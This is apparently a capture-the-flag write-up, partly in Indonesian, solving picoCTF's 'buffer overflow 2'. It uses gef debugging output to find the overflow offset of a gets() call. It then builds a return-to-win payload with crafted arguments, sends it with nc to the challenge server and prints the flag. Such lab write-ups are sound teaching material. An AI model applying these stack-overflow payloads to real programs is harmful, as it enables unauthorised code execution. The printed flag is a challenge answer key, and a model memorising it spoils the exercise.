<h1>buffer overflow 2</h1>
<h3>Description</h3>
<p>Control the return address and arguments
This time you'll need to control the arguments to the function you return to! Can you get the flag from this <a href='https://artifacts.picoctf.net/c/144/vuln'>program</a>?
You can view source <a href='https://artifacts.picoctf.net/c/144/vuln.c'>here</a>. And connect with it using nc saturn.picoctf.net 50209</p>
<h3>Solution</h3>
<p>Pertama check fungsi dari program</p>

```console
gef➤  info func
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x080490e0  printf@plt
0x080490f0  gets@plt
0x08049100  fgets@plt
0x08049110  getegid@plt
0x08049120  puts@plt
0x08049130  exit@plt
0x08049140  __libc_start_main@plt
0x08049150  setvbuf@plt
0x08049160  fopen@plt
0x08049170  setresgid@plt
0x08049180  _start
0x080491c0  _dl_relocate_static_pie
0x080491d0  __x86.get_pc_thunk.bx
0x080491e0  deregister_tm_clones
0x08049220  register_tm_clones
0x08049260  __do_global_dtors_aux
0x08049290  frame_dummy
0x08049296  win
0x08049338  vuln
0x08049372  main
0x080493f0  __libc_csu_init
0x08049460  __libc_csu_fini
0x08049465  __x86.get_pc_thunk.bp
0x0804946c  _fini
```
<p>disana terdapat fungsi win() dengan address 0x08049296, dan dilihat dari source codenya</p>

```c
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}
```
<p>Dari source code ada gets() dari fungsi vuln yang bisa terjadi overflow, dan juga fungsi win() tanpa pemangilan fungsi, kita dapat memanfaatkan gets() pada vuln(), dengan mencari overflow gets()</p>

```console
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r <<< "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
Starting program: /home/xisco/Downloads/vuln <<< "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
[Thread debugging using libthread_db enabled]
.................................................................................
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
.................................................................................
$eax   : 0xc9      
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xf7e2a9b8  →  0x00000000
$edx   : 0x0       
$esp   : 0xffffd3b0  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0x080493f0  →  <__libc_csu_init+0000> endbr32 
$edi   : 0xf7ffcba0  →  0x00000000
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
.................................................................................
gef➤  pattern search 0x62616164
[+] Searching for '64616162'/'62616164' with period=4
[+] Found at offset 112 (little-endian search) likely
```
<p>Overflow terjadi pada offset 112, selanjutnya check fungsi dari program yaitu address dari win() = 0x08049296</p>
<p>Next, test payload ke gef dan tambah string 20 digit "bbbbbbbbbbbbbbbbbbbb"</p>
<pre>
payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08
</pre>
<p>dan juga di fungsi win() ada required argumen 1 dan argumen 2 yang harus dipenuhi untuk print buf atau FLAG, kita bisa set breakpoint pada masing2 argumen</p>

```console
gef➤  b *0x08049315
Breakpoint 1 at 0x8049315
gef➤  b *0x0804930c
Breakpoint 2 at 0x804930c
gef➤  r <<< $(echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08")
    0x8049303 <win+006d>       push   eax
    0x8049304 <win+006e>       call   0x8049100 <fgets@plt>
    0x8049309 <win+0073>       add    esp, 0x10
●→  0x804930c <win+0076>       cmp    DWORD PTR [ebp+0x8], 0xcafef00d
    0x8049313 <win+007d>       jne    0x804932f <win+153>
●   0x8049315 <win+007f>       cmp    DWORD PTR [ebp+0xc], 0xf00df00d
    0x804931c <win+0086>       jne    0x8049332 <win+156>
    0x804931e <win+0088>       sub    esp, 0xc
    0x8049321 <win+008b>       lea    eax, [ebp-0x4c]
───────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x804930c in win (), reason: BREAKPOINT
─────────────────────────────────────────────────────────── trace ────
[#0] 0x804930c → win()
[#1] 0xffffd300 → or al, BYTE PTR [eax]
──────────────────────────────────────────────────────────────────────
gef➤  x/s $ebp+0x8
0xffffd3b4:	"\330\025\374\367\260\032\374", <incomplete sequence \367>
```
<p>pada ebp+0x8(argument 1) merupakan nilai compare untuk 0xcafef00d, yang isinya \330\025\374\367\260\032\374, maka tidak memenuhi dan return program, begitu juga dengan argument ke 2, dan ketika kita tambah string b 10x = bbbbbbbbbb</p>

```console
gef➤  r <<< $(echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08bbbbbbbbbb")
Starting program: /home/xisco/Downloads/vuln <<< $(echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08bbbbbbbbbb")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�bbbbbbbbbb

Breakpoint 2, 0x0804930c in win ()

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd360  →  "WIN\n"
$ebx   : 0x0804c000  →  0x0804bf10  →  <_DYNAMIC+0000> add DWORD PTR [eax], eax
$ecx   : 0x0       
$edx   : 0x0804e248  →  0x00000000
$esp   : 0xffffd354  →  "aaaaaaaaaaaaWIN\n"
$ebp   : 0xffffd3ac  →  "aaaabbbbbbbbbb"
$esi   : 0x080493f0  →  <__libc_csu_init+0000> endbr32 
$edi   : 0xf7ffcba0  →  0x00000000
$eip   : 0x0804930c  →  <win+0076> cmp DWORD PTR [ebp+0x8], 0xcafef00d
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
─────────────────────────────────────────────────────────── stack ────
0xffffd354│+0x0000: "aaaaaaaaaaaaWIN\n"	 ← $esp
0xffffd358│+0x0004: "aaaaaaaaWIN\n"
0xffffd35c│+0x0008: "aaaaWIN\n"
0xffffd360│+0x000c: "WIN\n"
0xffffd364│+0x0010: 0x61616100
0xffffd368│+0x0014: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
0xffffd36c│+0x0018: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
0xffffd370│+0x001c: 0x61616161
───────────────────────────────────────────────────── code:x86:32 ────
    0x8049303 <win+006d>       push   eax
    0x8049304 <win+006e>       call   0x8049100 <fgets@plt>
    0x8049309 <win+0073>       add    esp, 0x10
●→  0x804930c <win+0076>       cmp    DWORD PTR [ebp+0x8], 0xcafef00d
    0x8049313 <win+007d>       jne    0x804932f <win+153>
●   0x8049315 <win+007f>       cmp    DWORD PTR [ebp+0xc], 0xf00df00d
    0x804931c <win+0086>       jne    0x8049332 <win+156>
    0x804931e <win+0088>       sub    esp, 0xc
    0x8049321 <win+008b>       lea    eax, [ebp-0x4c]
───────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x804930c in win (), reason: BREAKPOINT
─────────────────────────────────────────────────────────── trace ────
[#0] 0x804930c → win()
──────────────────────────────────────────────────────────────────────
gef➤  x/s $ebp+0x8
0xffffd3b4:	"bbbbbb"
```
<p>output dari $ebp+0x8 jadi 6x bbbbbb, artinya 4x bbbb akan menjadi base pointer, dan 6x bbbbbb jadi nilai compare argument 1 dan begitu juga argument 2</p>
<pre>
payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08bbbb\r\xf0\xfe\xca\r\xf0\r\xf0
</pre>

```console
root@xisco-VirtualBox:/home/xisco/Downloads# echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08bbbb\r\xf0\xfe\xca\r\xf0\r\xf0" | nc saturn.picoctf.net 61874
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa���aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�bbbb
picoCTF{argum3nt5_4_d4yZ_27ecbf40}
```
<h3>Flag</h3>
<pre>
picoCTF{argum3nt5_4_d4yZ_27ecbf40}
</pre>
